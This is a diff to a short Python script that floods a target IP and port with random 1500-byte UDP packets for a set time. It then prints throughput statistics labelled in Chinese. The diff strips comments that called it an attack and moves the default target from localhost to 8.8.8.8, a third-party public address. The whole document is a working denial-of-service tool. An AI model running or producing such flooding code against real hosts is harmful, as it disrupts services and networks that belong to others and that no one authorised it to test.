@@ -6,22 +6,24 @@ import time
 
 def udpfloods(ip, port, user_input_time):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Creates a socket
-    mybyte = random._urandom(1024)  # Creates packet#todo 大包攻击 大于1500
-    # ip='10.1.12.173' #The IP we are attacking
-    # port=80 #Port we direct to attack
+    mybyte = random._urandom(1500)
     sent = 0
-    # st = time.time()
     print('success')
     st = time.time()
-    while 1:  # Infinitely loops sending packets to the port until the program is exited.
+    while 1:
         end = time.time()
-        if (end - st) < int(user_input_time):  # Change this value to change the duration of attack!!!
+        if (end - st) < int(user_input_time):
             sock.sendto(mybyte, (ip, int(port)))
             print("Sent %s amount of packets to %s at port %s." % (sent, ip, port))
             sent = sent + 1
         else:
+            print("任务数量:", sent)
+            print("总耗时(秒):", user_input_time)
+            print("每次请求耗时(秒):", (user_input_time) / (sent))
+            print("每秒承载请求数:", 1 / ((user_input_time) / (sent)))
             exit()
 
 
+
 if __name__ == '__main__':
-    udpfloods('127.0.0.1', '6000', 30)
+    udpfloods('8.8.8.8', '6000', 5)
